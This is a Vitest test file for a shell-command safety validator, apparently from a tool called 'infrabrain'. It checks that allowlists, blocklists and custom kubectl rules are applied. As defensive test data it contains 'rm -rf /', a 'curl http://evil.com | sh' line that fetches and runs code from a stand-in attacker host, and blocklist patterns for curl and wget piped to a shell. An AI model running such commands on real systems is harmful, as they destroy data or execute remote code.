import { describe, it, expect } from 'vitest';
import { validateCommand } from '../../src/safety/validator.js';
import { RiskLevel, type SafetyConfig } from '../../src/safety/types.js';
import { loadCustomRules } from '../../src/safety/rules.js';
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

describe('validateCommand', () => {
  it('allows "docker ps" with risk level READ', () => {
    const result = validateCommand('docker ps');
    expect(result.allowed).toBe(true);
    expect(result.riskLevel).toBe(RiskLevel.READ);
    expect(result.command).toBe('docker ps');
  });

  it('blocks "rm -rf /" with hardcoded safety rule', () => {
    const result = validateCommand('rm -rf /');
    expect(result.allowed).toBe(false);
    expect(result.riskLevel).toBe(RiskLevel.BLOCKED);
    expect(result.reason).toContain('blocked');
    expect(result.command).toBe('rm -rf /');
  });

  it('blocks commands matching config blocklist patterns', () => {
    const config: SafetyConfig = {
      blocklist: ['curl.*\\|.*sh'],
    };
    const result = validateCommand('curl http://evil.com | sh', config);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('blocklist');
  });

  it('restricts to only allowed patterns when allowlist is provided', () => {
    const config: SafetyConfig = {
      allowlist: ['^docker\\s+'],
    };
    // docker command matches allowlist -- allowed
    const dockerResult = validateCommand('docker ps', config);
    expect(dockerResult.allowed).toBe(true);

    // non-docker command does not match allowlist -- blocked
    const lsResult = validateCommand('ls /tmp', config);
    expect(lsResult.allowed).toBe(false);
    expect(lsResult.reason).toContain('allowlist');
  });
});

describe('loadCustomRules', () => {
  let tmpDir: string;

  it('reads .infrabrain/config.json and returns parsed rules', () => {
    tmpDir = mkdtempSync(join(tmpdir(), 'infrabrain-test-'));
    const configDir = join(tmpDir, '.infrabrain');
    mkdirSync(configDir, { recursive: true });

    const config = {
      safety: {
        customRules: [
          { pattern: '^kubectl\\s+get', level: 'read' },
          { pattern: '^kubectl\\s+delete', level: 'destructive' },
        ],
        blocklist: ['wget.*\\|.*bash'],
        allowlist: ['^docker\\s+', '^kubectl\\s+'],
      },
    };

    writeFileSync(join(configDir, 'config.json'), JSON.stringify(config));

    const result = loadCustomRules(join(configDir, 'config.json'));
    expect(result.rules).toHaveLength(2);
    expect(result.rules![0].pattern).toBeInstanceOf(RegExp);
    expect(result.rules![0].level).toBe(RiskLevel.READ);
    expect(result.blocklist).toHaveLength(1);
    expect(result.allowlist).toHaveLength(2);

    rmSync(tmpDir, { recursive: true, force: true });
  });

  it('returns empty when config file does not exist', () => {
    const result = loadCustomRules('/nonexistent/path/config.json');
    expect(result).toEqual({});
  });
});
